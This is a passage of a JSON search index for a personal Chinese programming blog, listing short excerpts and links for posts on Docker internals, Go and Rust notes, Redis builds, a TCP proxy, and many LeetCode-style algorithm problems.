epoll优化","lvl1":["tcp代理实践"],"lvl2":"摘要","objectID":"221ff3337ea7747504043f5a6d057452","tags":["tcp代理实践"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/tcp%E4%BB%A3%E7%90%86%E5%AE%9E%E8%B7%B5/linux%E4%B8%8B%E4%BD%BF%E7%94%A8-epoll%E4%BC%98%E5%8C%96/"},{"content":"windows使用iocp优化 ​ 参考项目，windows下使用 epoll优化","lvl0":"windows使用iocp优化","lvl1":["tcp代理实践"],"lvl2":"摘要","objectID":"a375464e291e66305021df1eb744bdc6","tags":["tcp代理实践"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/tcp%E4%BB%A3%E7%90%86%E5%AE%9E%E8%B7%B5/windows%E4%BD%BF%E7%94%A8iocp%E4%BC%98%E5%8C%96/"},{"content":"docker 文件系统 ​ 参考博客 相关概念： 镜像分层、 checksum 存储驱动 docker containerd AUFS 在ubuntu或者debian支持 不支持 OverlayFs 支持 支持 Device Mapper 支持 支持 Btrfs 社区版本在ubunt","lvl0":"docker 文件系统","lvl1":["Docker学习"],"lvl2":"摘要","objectID":"c1fb0c1d22515919f6968f90d16ec0e5","tags":["Docker学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/docker-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"linux control groups(cgroups) ​ cgroup配置目录 1 2 3 4 5 6 7 struct task_struct { #ifdef CONFIG_CGROUPS struct css_set __rcu *cgroups; struct list_head cg_list; #endif } 1 2 3 4 5 6 7 8 struct css_set { /* * Set of subsystem states, one for each subsystem. This array is * immutable after creation apart from the init_css_set during * subsystem","lvl0":"linux control groups(cgroups)","lvl1":["Docker学习"],"lvl2":"摘要","objectID":"6ec34d1ad3304b6745c323f5f92fbdcb","tags":["Docker学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/linux-control-groupscgroups/"},{"content":"redis源码学习记录 ​ cygwin工具介绍 cygwin大神介绍 编译redis源码 编译报错遇到的问题 1 2 3 cd src make distclean make all 参考csdn文章 坑逼问","lvl0":"redis源码学习记录","lvl1":["redis源码学习"],"lvl2":"摘要","objectID":"44440568151bd98323abb38e48abf32b","tags":["redis源码学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/cpp/redis%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/redis%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"content":"linux namespace详解 ​ 1 2 3 4 5 6 7 8 9 10 lyr@DESKTOP-FSVN6C0:~$ lsns # 查看 linux系统多有哪些namespace NS TYPE NPROCS PID USER COMMAND 4026531835 cgroup 2 12 lyr -bash 4026531837 user 2 12 lyr -bash 4026531992 net 2 12","lvl0":"linux namespace详解","lvl1":["Docker学习"],"lvl2":"摘要","objectID":"7890efbde69f11b1b76435cb357634e0","tags":["Docker学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/linux-namespace%E8%AF%A6%E8%A7%A3/"},{"content":"rust语法 ​ 安装rust遇到的问题 1 2 rustup toolchain install stable-x86_64-pc-windows-gnu rustup default stable-x86_64-pc-windows-gnu shadowing特性 声明相同名字的变量，前面的变量会被隐藏 1 2 3 4 5 6 7 8 9 10 11 12 13","lvl0":"rust语法","lvl1":["rust"],"lvl2":"摘要","objectID":"84f28003ee00e62b36c946b5e2d2d733","tags":["rust"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/rust/rust%E8%AF%AD%E6%B3%95/"},{"content":"DP37【模板】差分 ​ 给你一个长度为n的正数数组$a_1,a_2,\u0026hellip;a_n $ 接下来对这个数组进行m次操作，每个操作包含三个参数","lvl0":"DP37【模板】差分","lvl1":["差分前缀和"],"lvl2":"摘要","objectID":"fe1d5305931bd96c49d906246f70b316","tags":["差分前缀和"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%B7%AE%E5%88%86%E5%89%8D%E7%BC%80%E5%92%8C/dp37%E6%A8%A1%E6%9D%BF%E5%B7%AE%E5%88%86/"},{"content":"dp8.乘积为正数的最长连续子数组 ​ 给定一个长度为 n 的整数数组，请你找出其中最长的乘积为正数的子数组长度。 子数组的定义是原数组中一定长度的连","lvl0":"dp8.乘积为正数的最长连续子数组","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"f4f9e4ea401f7b142e927186cea56add","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/dp8.%E4%B9%98%E7%A7%AF%E4%B8%BA%E6%AD%A3%E6%95%B0%E7%9A%84%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84/"},{"content":"买卖股票的最好时机(二) ​ 描述 假设你有一个数组prices，长度为n，其中prices[i]是某只股票在第i天的价格，请根据这个价格数组，返","lvl0":"买卖股票的最好时机(二)","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"4d958d33aa70016555a97e5553e36c28","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A5%BD%E6%97%B6%E6%9C%BA%E4%BA%8C/"},{"content":"主持人调度 描述 有 n 个活动即将举办，每个活动都有开始时间与活动的结束时间，第 i 个活动的开始时间是 starti ,第 i 个活动的结束时间是 endi ,举办某个活动就需","lvl0":"主持人调度","lvl1":["贪心算法"],"lvl2":"摘要","objectID":"189ecd837e270748fb0766e7e0d09132","tags":["贪心算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/%E4%B8%BB%E6%8C%81%E4%BA%BA%E8%B0%83%E5%BA%A6/"},{"content":"分糖果问题 ​ 描述 一群孩子做游戏，现在请你根据游戏得分来发糖果，要求如下： \\1. 每个孩子不管得分多少，起码分到一个糖果。 \\2. 任意两个相邻的孩子之间，","lvl0":"分糖果问题","lvl1":["贪心算法"],"lvl2":"摘要","objectID":"0f3873881e0fcf1e0801349adb09cb6a","tags":["贪心算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/%E5%88%86%E7%B3%96%E6%9E%9C%E9%97%AE%E9%A2%98/"},{"content":"接雨水 ​ 给定一个整形数组arr，已知其中所有的值都是非负的，将这个数组看作一个柱子高度图，计算按此排列的柱子，下雨之后能接多少雨水。(数组以","lvl0":"接雨水","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"7b735e27054554043b6f87307af9cf81","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/%E6%8E%A5%E9%9B%A8%E6%B0%B4/"},{"content":"最长上升子序列 ​ 练习题 解题代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class Solution { public: /** * 代码中的类名、方法名、参数名已经指定","lvl0":"最长上升子序列","lvl1":["动态规划 dp模板题"],"lvl2":"摘要","objectID":"ee0f558230ef360793c322ea365f0c08","tags":["动态规划 dp模板题"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97/"},{"content":"BM70兑换零钱 ​ 描述 给定数组arr，arr中所有的值都为正整数且不重复。每个值代表一种面值的货币，每种面值的货币可以使用任意张，再给定一个","lvl0":"BM70兑换零钱","lvl1":["完全背包"],"lvl2":"摘要","objectID":"3112074cf5780b095c45bb1b1a4eafa5","tags":["完全背包"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/bm70%E5%85%91%E6%8D%A2%E9%9B%B6%E9%92%B1/"},{"content":"完全背包问题两种解法 ​ 有 $N$ 种物品和一个容量是 $V$ 的背包，每种物品都有无限件可用。 第 $i$ 种物品的体积是 $v_i$，价值是 $w_i$。 求解将哪些物品","lvl0":"完全背包问题两种解法","lvl1":["完全背包"],"lvl2":"摘要","objectID":"dfbcd3142d2d1d562c62dfb4cd23efb9","tags":["完全背包"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85/%E5%AE%8C%E5%85%A8%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95/"},{"content":"bm52.数据中只出现一次的两个数字 ​ 一个整型数组里除了两个数字只出现一次，其他的数字都出现了两次。请写程序找出这两个只出现一次的数字。 数据","lvl0":"bm52.数据中只出现一次的两个数字","lvl1":["位运算"],"lvl2":"摘要","objectID":"248241571d6053eda89e19b14c4522eb","tags":["位运算"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E5%AD%A6/%E4%BD%8D%E8%BF%90%E7%AE%97/bm52.%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%95%B0%E5%AD%97/"},{"content":"lc.596.超过5名学生的课 SQL架构表: Courses 1 2 3 4 5 6 +-------------+---------+ | Column Name | Type | +-------------+---------+ | student | varchar | | class | varchar | +-------------+---------+ (student, class)是该表的主键列。 该表的每一行表","lvl0":"lc.596.超过5名学生的课","lvl1":["sql练习"],"lvl2":"摘要","objectID":"67877e3371a50436ba78f1542a28795b","tags":["sql练习"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/sql%E7%BB%83%E4%B9%A0/lc.596.%E8%B6%85%E8%BF%875%E5%90%8D%E5%AD%A6%E7%94%9F%E7%9A%84%E8%AF%BE/"},{"content":"数组中第k大的数字 ​ 给定整数数组 nums 和整数 k，请返回数组中第 k 个最大的元素。 请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同","lvl0":"数组中第k大的数字","lvl1":["快速排序"],"lvl2":"摘要","objectID":"51e7fb7bb7a57a8185468ea9e4b0c746","tags":["快速排序"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/%E6%95%B0%E7%BB%84%E4%B8%AD%E7%AC%ACk%E5%A4%A7%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"11.unsafe ​ golang 可以通过 unsafe 获取私有变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 type Student struct { Name string Age int } func main() { s := Student{} s.Name = \u0026#34;Peter\u0026#34; s.Age = 33 pStudent := unsafe.Pointer(\u0026amp;s) // 整个对象转换成指针","lvl0":"11.unsafe","lvl1":["01.Go"],"lvl2":"摘要","objectID":"10e366593dcd0449645d20e17774aaed","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/11.unsafe/"},{"content":"7.元编程 ​ 这里主要包括插件系统以及代码生成这两个部分，鉴于面试应该不会问这个问题，所以我就不写了","lvl0":"7.元编程","lvl1":["01.Go"],"lvl2":"摘要","objectID":"8cc87b0e5f76d976b9326569b21d5ca5","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/7.%E5%85%83%E7%BC%96%E7%A8%8B/"},{"content":"lc.1425.带限制的子序列和 ​ 给你一个整数数组 nums 和一个整数 k ，请你返回 非空 子序列元素和的最大值，子序列需要满足：子序列中每两个 相邻 的整数","lvl0":"lc.1425.带限制的子序列和","lvl1":["单调队列优化dp"],"lvl2":"摘要","objectID":"85638773d3aabce1ab37de77e303aab0","tags":["单调队列优化dp"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97%E4%BC%98%E5%8C%96dp/lc.1425.%E5%B8%A6%E9%99%90%E5%88%B6%E7%9A%84%E5%AD%90%E5%BA%8F%E5%88%97%E5%92%8C/"},{"content":"lc.918.环形子数组最大和 ​ 给定一个长度为 n 的环形整数数组 nums ，返回 nums 的非空 子数组 的最大可能和 。 环形数组 意味着数组的末端将会与开头相连呈环","lvl0":"lc.918.环形子数组最大和","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"61abf7dd705ae39e6fd95e842f750090","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.918.%E7%8E%AF%E5%BD%A2%E5%AD%90%E6%95%B0%E7%BB%84%E6%9C%80%E5%A4%A7%E5%92%8C/"},{"content":"9.其他 ​ Go的基本命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 用于打包编译代码 go build // 来移除当前源码包和关联源码包里面编译生成的文件","lvl0":"9.其他","lvl1":["01.Go"],"lvl2":"摘要","objectID":"f666742156fc8681d46d7850ffeb0e16","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/9.%E5%85%B6%E4%BB%96/"},{"content":"5.并发编程 ​ 上下文context 这东西是用于控制并发的。下面是一个简单的例子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31","lvl0":"5.并发编程","lvl1":["01.Go"],"lvl2":"摘要","objectID":"73f5a851baaa71ee040187c89e6d3e4b","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/5.%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"},{"content":"1.编译原理 ​ 基本概念 抽象语法树 是源代码语法的结构的一种抽象表示，它用树状的方式表示编程语言的语法结构1。抽象语法树中的每一个节点都表示源代","lvl0":"1.编译原理","lvl1":["01.Go"],"lvl2":"摘要","objectID":"225fd3b2e3241678de2b9dcfc9b458a2","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/1.%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"content":"10.面试问题 ​ 基础相关 map怎么实现顺序读取 把map中的key通过sort包排序 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sort\u0026#34; )","lvl0":"10.面试问题","lvl1":["01.Go"],"lvl2":"摘要","objectID":"545c1e6a0b2de637a9e3307a038084a5","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/10.%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/"},{"content":"6.内存管理 ​ 程序中的数据和变量都会被分配到程序所在的虚拟内存中，内存空间包含两个重要区域：栈区（Stack）和堆区（Heap）。函数调用的","lvl0":"6.内存管理","lvl1":["01.Go"],"lvl2":"摘要","objectID":"8c7b94bda4cac7efe180f53b2ba594db","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/6.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"content":"8.标准库 ​ JSON 序列化和反序列化 go的序列化大部分指的是把结构体转换为json数据，在序列化的时候要注意变量名必须要大写，小写字母开头的变量是","lvl0":"8.标准库","lvl1":["01.Go"],"lvl2":"摘要","objectID":"2ff35549a127ffaa6a647ae2be810d4f","tags":["01.Go"],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/8.%E6%A0%87%E5%87%86%E5%BA%93/"},{"content":"​ docker docker理论基础 基于 Linux 内核的 Cgroup，Namespace，以及 Union FS 等技术，对进程进行封装隔离，属于操作系统 层面的虚拟化技术，由于","lvl0":"docker理论基础","lvl1":["Docker学习"],"lvl2":"摘要","objectID":"05d352987627a3e5e44cbb433390ae08","tags":["Docker学习"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/docker%E5%AD%A6%E4%B9%A0/docker%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/"},{"content":"lc.402.移掉k位数字 给你一个以字符串表示的非负整数 num 和一个整数 k ，移除这个数中的 k 位数字，使得剩下的数字最小。请你以字符串形式返回这个","lvl0":"lc.402.移掉k位数字","lvl1":["栈"],"lvl2":"摘要","objectID":"80c8778bc02623db4240d7826df5679b","tags":["栈","单调栈"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88/lc.402.%E7%A7%BB%E6%8E%89k%E4%BD%8D%E6%95%B0%E5%AD%97/"},{"content":"lc.剑指offer.出现频率最高的k个数字 ​ 给定一个整数数组 nums 和一个整数 k ，请返回其中出现频率前 k 高的元素。可以按 任意顺序 返回答案。 示例 1:","lvl0":"lc.剑指offer.出现频率最高的k个数字","lvl1":["堆"],"lvl2":"摘要","objectID":"ed8f1b97a7f83786bebd3121be809898","tags":["堆"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%A0%86/lc.%E5%89%91%E6%8C%87offer.%E5%87%BA%E7%8E%B0%E9%A2%91%E7%8E%87%E6%9C%80%E9%AB%98%E7%9A%84k%E4%B8%AA%E6%95%B0%E5%AD%97/"},{"content":"lc.16.最接近的三数之和 给你一个长度为 n 的整数数组 nums 和 一个目标值 target。请你从 nums 中选出三个整数，使它们的和与 target 最接近。 返回这三个数","lvl0":"lc.16.最接近的三数之和","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"182259f88f40927b346325de448829e7","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.16.%E6%9C%80%E6%8E%A5%E8%BF%91%E7%9A%84%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/"},{"content":"lc.719.找出第k小的距离对 ​ 给定一个整数数组，返回所有数对之间的第 k 个最小距离。一对 (A, B) 的距离被定义为 A 和 B 之间的绝对差值。 示例 1: 输入","lvl0":"lc.719.找出第k小的距离对","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"a49069f5a9431cc088aad468f5e21ab2","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.719.%E6%89%BE%E5%87%BA%E7%AC%ACk%E5%B0%8F%E7%9A%84%E8%B7%9D%E7%A6%BB%E5%AF%B9/"},{"content":"lc.611.有效三角形的个数 ​ 给定一个包含非负整数的数组 nums ，返回其中可以组成三角形三条边的三元组个数。 示例 1: 输入: nums = [2,2,3,4] 输出: 3 解释:有效","lvl0":"lc.611.有效三角形的个数","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"8da28c7c6ac0e6f77d9778dafc5345c1","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.611.%E6%9C%89%E6%95%88%E4%B8%89%E8%A7%92%E5%BD%A2%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"content":"lc.167.两数之和II-有序数组 ​ 题目链接 给你一个下标从 1 开始的整数数组 numbers ，该数组已按 非递减顺序排列 ，请你从数组中找出满足相加之和等于目","lvl0":"lc.167.两数之和II-有序数组","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"267ed4aff92515127f90fa1b94c03165","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.167.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8Cii-%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84/"},{"content":"lc.11.盛最多水的容器 给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。 找出其中的两条线，使得它们与 x 轴共同构成","lvl0":"lc.11.盛最多水的容器","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"9a5f1df52a042d99884636c167243bbb","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/lc.11.%E7%9B%9B%E6%9C%80%E5%A4%9A%E6%B0%B4%E7%9A%84%E5%AE%B9%E5%99%A8/"},{"content":"bm89.合并区间 ​ 题目链接 给出一组区间，请合并所有重叠的区间。 请保证合并后的区间按区间起点升序排列。 1 2 3 4 5 输入： [[10,30],[20,60],[80,100],[150,180]] 返回值： [[10,60],[80,100],[150,180]] 1 2 3 4 5","lvl0":"bm89.合并区间","lvl1":["双指针算法"],"lvl2":"摘要","objectID":"324f40db6cde8e73725a50547e74340d","tags":["双指针算法"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8F%8C%E6%8C%87%E9%92%88%E7%AE%97%E6%B3%95/bm89.%E5%90%88%E5%B9%B6%E5%8C%BA%E9%97%B4/"},{"content":"面试题.正则表达式匹配 请实现一个函数用来匹配包含\u0026rsquo;. \u0026lsquo;和\u0026rsquo;\u0026lsquo;的正则表达式。模式中的字符\u0026rs","lvl0":"面试题.正则表达式匹配","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"834a8510613c9685e7da037853d824a7","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/%E9%9D%A2%E8%AF%95%E9%A2%98.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/"},{"content":"lc.剑指.爬楼梯的最小成本 数组的每个下标作为一个阶梯，第 i 个阶梯对应着一个非负数的体力花费值 cost[i]（下标从 0 开始）。 每当爬上一个阶","lvl0":"lc.剑指.爬楼梯的最小成本","lvl1":["状态转移dp【有向图的最大长度】"],"lvl2":"摘要","objectID":"b32bbd97e0df3b59f8013eb13de34ccb","tags":["状态转移dp【有向图的最大长度】"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.%E5%89%91%E6%8C%87.%E7%88%AC%E6%A5%BC%E6%A2%AF%E7%9A%84%E6%9C%80%E5%B0%8F%E6%88%90%E6%9C%AC/"},{"content":"lc.删除链表倒数第n个节点 ​ 给定一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。 示例 1： 1 2 输入：head = [1,2,3,4,5], n = 2 输出：[1,","lvl0":"lc.删除链表倒数第n个节点","lvl1":["链表"],"lvl2":"摘要","objectID":"52a69023696f37f312cf19c19620551e","tags":["链表"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%93%BE%E8%A1%A8/lc.%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E5%80%92%E6%95%B0%E7%AC%ACn%E4%B8%AA%E8%8A%82%E7%82%B9/"},{"content":"lc.排序数组的两数之和 ​ 给定一个已按照 升序排列 的整数数组 numbers ，请你从数组中找出两个数满足相加之和等于目标数 target 。 函数应该以长度为 2 